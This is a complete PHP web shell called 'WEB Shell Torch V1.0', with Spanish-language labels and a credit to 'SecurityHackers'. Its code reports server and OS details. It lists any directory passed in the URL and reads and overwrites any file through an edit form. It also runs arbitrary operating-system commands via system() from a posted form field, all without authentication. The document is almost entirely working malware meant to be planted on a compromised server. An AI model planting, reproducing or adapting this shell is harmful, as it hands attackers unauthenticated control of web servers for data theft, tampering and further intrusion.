<html>
<head>
	<title>WEB Shell Torch V1.0</title>
	<STYLE type="text/css">

	body {
	background-color: #000000;
	color:green;
	font-family:
	Courier New;
	cursor: url(http://www.fotosbebes.org/cursores/hand01.cur);
	font-size: small;
	}
	A:link {
	color:green;
	text-decoration:none;
	}
	A:visited {
	color:green;
	text-decoration:none;
	}
	A:hover {
	color:green;
	text-decoration:none;
	}
	
	p {
	color:#0F0;
	font-family: Courier New;
	}
	b {
	color:#0F0;
	font family: Verdana;
	}
	i {
	color:#0F0;
	font family: Verdana;
	}
	strike {
	color:#0F0;
	font family: Tahoma;
	}
	div {
	width: 80%;
	font-family: Courier New;
	border:0px dashed red;
	text-align: left;
	}
	</STYLE>
</head>
<body>
	<center>
	<h1>..:: <font color=ffffff>RoOt~ErrOr</font> ::..</h1>
	<p><font color=ffffff>By SecurityHackers</font></p>
	<p><font color=red>[ </font><font color=ffffff>Name</font><font color=#999> Torch</font><font color=ffffff> Version</font><font color=#999> 1.0</font><font color=red> ]</font></p><br>
	<br>
	<table>
	<div></div><br>
	<div>
	<b>Informacion del Server</b><br><br>
<?php
	$Server=$_SERVER[SERVER_SOFTWARE];
	echo "<i>Server:</i> ".$Server;
	$OS=php_uname();
	echo "<br><i>Operative System:</i> ".$OS;
	$Server_IP=$_SERVER[SERVER_ADDR];
	echo "<br><i>Server IP Address:</i> ".$Server_IP;
	$Shell_Route=$_SERVER[SCRIPT_FILENAME];
	echo "<br><i>Shell route:</i> ".$Shell_Route;
?>
	<br><br>
	</div>
	<br><div></div><br>
	<div>
<?php
	if (isset ($_GET["path"])){
		$path=$_GET["path"];
		$dir=dir($path);}
	else{
		$path=getcwd();
		$dir=dir($path);}
	echo "<b>Listado del directorio</b><br><br>";
	echo "<b>Directorio actual:</b> ".$path."<br><br>";
	echo "<b>Carpetas:</b><br>";
	$counter=0;
	while($file=$dir->read()){
		$extension=filetype($path.'/'.$file);
		if ($extension=="dir"){
			$counter+=1;
			$route=urlencode($path."/".$file);
			echo "<a href=?path=".$route.">".$file."</a><br>";}}
	if ($counter==0){
			echo "<i>No existen carpetas dentro del directorio.</i><br>";
	}
	echo "<br><b>Archivos:</b><br>";
	$dir->rewind();
	$counter=0;
	while($file=$dir->read()){
		$extension=filetype($path.'/'.$file);
		if ($extension!="dir"){
			$counter+=1;
			$route=urlencode($path."/".$file);
			echo "<a href=?edit=".$route.">".$file."</a><br>";}}
	if ($counter==0){
	echo "<br><i>No existen archivos dentro del directorio.</i><br>";
	}
	$dir->close();
?>
	<br>
	</div>
	<br><div></div><br>
<?php
	if (isset ($_GET["edit"])){
	echo "<div><center><b>Editar:</b><i> ".$_GET["edit"]."</i><br><br>";
	echo "<form method=\"post\" action=\"\">";
	echo "<textarea cols=95 rows=30 name=\"code\">";
	$read=fopen($_GET['edit'], r);
	$read=fread($read,filesize($_GET['edit']));
	echo htmlentities($read);
	echo "</textarea><br><input name=\"change\" type=\"submit\" value=\"Guardar\"><br></center></form>";
	if(isset($_POST["change"])){
	$write=fopen($_GET['edit'],w);
	$code=stripslashes($_POST['code']);
	$ok=fwrite($write,$code);}
	echo "</div><br><div></div><br>";
	}
?>

<?php
if(isset($_GET['cmd'])){ // index.php?cmd=
echo '<form method=POST action="?cmd"> 
<input type=TEXT name=command value="'.$_POST['command'].'"> /
<input type=submit name=eje value="Ejecutar">';
echo '</form>';
	  if($_POST['command']!="" && isset($_POST['eje'])){
	  echo '<textarea cols="100" rows="30">';
	  system($_POST['command']);
	  echo '</textarea>';
	  exit();
    }
	exit();
}
?>
	</center>
</body>
</html>
